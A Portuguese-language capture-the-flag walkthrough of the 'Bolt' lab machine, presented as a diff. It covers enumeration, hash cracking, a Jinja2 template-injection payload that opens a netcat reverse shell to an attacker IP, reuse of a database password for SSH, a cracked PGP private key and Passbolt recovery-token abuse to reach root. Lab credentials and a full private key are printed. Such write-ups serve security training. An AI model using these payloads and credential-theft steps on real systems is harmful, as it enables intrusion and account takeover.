@@ -1,0 +1,406 @@
+nmap -sCV  10.10.11.114  -Pn
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 17:05 EDT
+Nmap scan report for 10.10.11.114
+Host is up (0.12s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
+|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
+|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
+80/tcp  open  http     nginx 1.18.0 (Ubuntu)
+|_http-title:     Starter Website -  About 
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
+| http-title: Passbolt | Open source password manager for teams
+|_Requested resource was /auth/login?redirect=%2F
+| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
+| Not valid before: 2021-02-24T19:11:23
+|_Not valid after:  2022-02-24T19:11:23
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.28 seconds
+
+
+http://bolt.htb/download
+
+Baixar o arquivo. tar
+
+Agora usaremos o comando strings para podermos ver alguns dados do arquivo e salvaremos esses dados em um arquivo .txt
+
+strings image.tar >> haha.txt
+
+Agora procuraremos por credenciais
+
+grep -w admin haha.txt
+grep -w password haha.txt
+grep -w bolt haha.txt
+
+Ao usar o grep -w bolt haha.txt vemos uma hash
+
+adminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
+
+Salvamos ela e damos crack
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+deadbolt         (?)
+1g 0:00:00:04 DONE (2021-11-05 18:10) 0.2267g/s 39183p/s 39183c/s 39183C/s dohaqatar..curlyfry
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+
+admin:deadbolt
+
+
+Depois de olhar o site principal procurei por sub dominios
+
+gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bolt.htb/ -t 20
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://bolt.htb/
+[+] Method:       GET
+[+] Threads:      20
+[+] Wordlist:     /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2021/11/05 18:33:46 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: mail.bolt.htb (Status: 200) [Size: 4943]
+Found: demo.bolt.htb (Status: 302) [Size: 219] 
+Found: Mail.bolt.htb (Status: 200) [Size: 4943]
+Found: Demo.bolt.htb (Status: 302) [Size: 219] 
+
+No demo.bolt.htb precisamos de um codigo de convite
+
+ffuf -c -u http://demo.bolt.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .html,.php,.txt -c
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://demo.bolt.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+ :: Extensions       : .html .php .txt 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+login                   [Status: 200, Size: 9710, Words: 2380, Lines: 179]
+logout                  [Status: 302, Size: 219, Words: 22, Lines: 4]
+register                [Status: 200, Size: 11066, Words: 3054, Lines: 199]
+sign-in.html            [Status: 200, Size: 9710, Words: 2380, Lines: 179]
+sign-up.html            [Status: 200, Size: 11066, Words: 3054, Lines: 199]
+:: Progress: [81876/81876] :: Job [1/1] :: 319 req/sec :: Duration: [0:04:10] :: Errors: 0 ::
+
+Ao olhar novamente o arquivo image.tar
+
+Procuramos por palavras chave que possam ter esse codigo
+
+grep -w Invite haha.txt
+
+grep -w code haha.txt
+
+Quando usamos esse comando aparece um monte de informação
+
+Então usamos o comando grep -w code haha.txt >> code.txt
+
+Agora podemos ler tudo o que nos foi retornado com a palavra code
+
+sublime code.txt
+
+CTRL+F invite 
+
+code	  = request.form['invite_code']
+        if code != 'XNSS-HSJW-3NGU-8XTJ':
+
+Agora com esse codigo podemos cirar nossa conta no demo.bolt.htb
+
+E com a mesma conta podemos acessar o mail.bolt.htb
+
+Depois de procurar por vulnerabilidades encontrei uma 
+
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+
+Editaremos o codigo para pegarmos uma shell
+
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.82 4444 >/tmp/f')|attr('read')()}}
+
+O campo que iremos colocar esse codigo é no nome em http://demo.bolt.htb/admin/profile
+
+Depois de alterar abrimos nossa conexao com o netcat e vamos em mail.bolt.htb
+
+E confiramemos a mudança. Quando confirmar teremos uma shell
+
+Ao rodar o linpeas na maquina eles nos mostra alguns caminhos que pode ter algo
+/var/mail/eddie
+/var/spool/mail/eddie
+/etc/passbolt
+
+cat /etc/passbolt/passbolt.php
+<?php
+/**
+ * Passbolt ~ Open source password manager for teams
+ * Copyright (c) Passbolt SA (https://www.passbolt.com)
+ *
+ * Licensed under GNU Affero General Public License version 3 of the or any later version.
+ * For full copyright and license information, please see the LICENSE.txt
+ * Redistributions of files must retain the above copyright notice.
+ *
+ * @copyright     Copyright (c) Passbolt SA (https://www.passbolt.com)
+ * @license       https://opensource.org/licenses/AGPL-3.0 AGPL License
+ * @link          https://www.passbolt.com Passbolt(tm)
+ * @since         2.0.0
+ */
+/**
+ * PASSBOLT CONFIGURATION FILE
+ *
+ * This is a generated configuration file, which was generated by the passbolt web installer.
+ *
+ * To see all available options, you can refer to the default.php file, or replace this file
+ * by a copy of passbolt.default.php
+ * Do not modify default.php or you may break your upgrade process.
+ *
+ * Read more about how to install passbolt: https://www.passbolt.com/help/tech/install
+ * Any issue, check out our FAQ: https://www.passbolt.com/faq
+ * An installation issue? Ask for help to the community: https://community.passbolt.com/
+ */
+return [
+    'App' => [
+        // A base URL to use for absolute links.
+        // The url where the passbolt instance will be reachable to your end users.
+        // This information is need to render images in emails for example
+        'fullBaseUrl' => 'https://passbolt.bolt.htb',
+    ],
+
+    // Database configuration.
+    'Datasources' => [
+        'default' => [
+            'host' => 'localhost',
+            'port' => '3306',
+            'username' => 'passbolt',
+            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
+            'database' => 'passboltdb',
+        ],
+    ],
+
+    // Email configuration.
+    'EmailTransport' => [
+        'default' => [
+            'host' => 'localhost',
+            'port' => 587,
+            'username' => null,
+            'password' => null,
+            // Is this a secure connection? true if yes, null if no.
+            'tls' => true,
+            //'timeout' => 30,
+            //'client' => null,
+            //'url' => null,
+        ],
+    ],
+    'Email' => [
+        'default' => [
+            // Defines the default name and email of the sender of the emails.
+            'from' => ['localhost@bolt.htb' => 'localhost'],
+            //'charset' => 'utf-8',
+            //'headerCharset' => 'utf-8',
+        ],
+    ],
+    'passbolt' => [
+        // GPG Configuration.
+        // The keyring must to be owned and accessible by the webserver user.
+        // Example: www-data user on Debian
+        'gpg' => [
+            // Main server key.
+            'serverKey' => [
+                // Server private key fingerprint.
+                'fingerprint' => '59860A269E803FA094416753AB8E2EFB56A16C84',
+                'public' => CONFIG . DS . 'gpg' . DS . 'serverkey.asc',
+                'private' => CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc',
+            ],
+        ],
+        'registration' => [
+            'public' => false,
+        ],
+        'ssl' => [
+            'force' => true,
+        ]
+    ],
+];
+
+
+mysql -h localhost -u passbolt -p
+rT2;jW7<eY8!dX8}pQ8%
+
+
+Depois de tentar varias coisas decidi tentar logar com essa senha do database no usuario eddie
+
+ssh eddie@bolt.htb
+rT2;jW7<eY8!dX8}pQ8%
+
+cat /var/mail/eddie 
+From clark@bolt.htb  Thu Feb 25 14:20:19 2021
+Return-Path: <clark@bolt.htb>
+X-Original-To: eddie@bolt.htb
+Delivered-To: eddie@bolt.htb
+Received: by bolt.htb (Postfix, from userid 1001)
+        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
+Subject: Important!
+To: <eddie@bolt.htb>
+X-Mailer: mail (GNU Mailutils 3.7)
+Message-Id: <20210225212019.DFF264CD@bolt.htb>
+Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
+From: Clark Griswold <clark@bolt.htb>
+
+Hey Eddie,
+
+The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
+Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...
+
+-Clark
+
+
+grep -iR "BEGIN PGP"
+
+Binary file .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
+
+
+Baixamos o arquivo na nossa maquina
+
+E editamos o arquivo
+
+
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+Version: OpenPGP.js v4.10.9
+Comment: https://openpgpjs.org
+
+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
+PSwYYWlAywj5
+=cqxZ
+-----END PGP PRIVATE KEY BLOCK-----
+
+gpg2john teste_key > hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 16777216 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+merrychristmas   (Eddie Johnson)
+1g 0:00:09:22 DONE (2021-11-05 23:08) 0.001779g/s 76.23p/s 76.23c/s 76.23C/s mhiedhie..memoteamo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+Depois de dar crack na PGP key voltei ao database e olhei a tabela email_queue
+
+No meio dela ela nos mostra dominio
+
+https://passbolt.bolt.htb 
+
+Ao acessar o site ele nos pede um e-mail
+
+Passamos o e-mail do eddie "eddie@bolt.htb"
+
+E voltamos ao database e procuramos por um token de autenticação
+
+select token from authentication_tokens where user_id = (select id from users where username = 'eddie@bolt.htb') and type = 'recover' order by created DESC;
+
+Depois pegamos o id do eddie
+
+Select * from users;
+
+E passamos como esta nesse site
+
+https://community.passbolt.com/t/recover-account-on-a-network-without-email/1394
+
+Ao fazer isso instalamos a extensão e podemos pegar a senha do root
+
+Username:root
+Password:Z(2rmxsNW(Z?3=p/9s
+
+id;whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
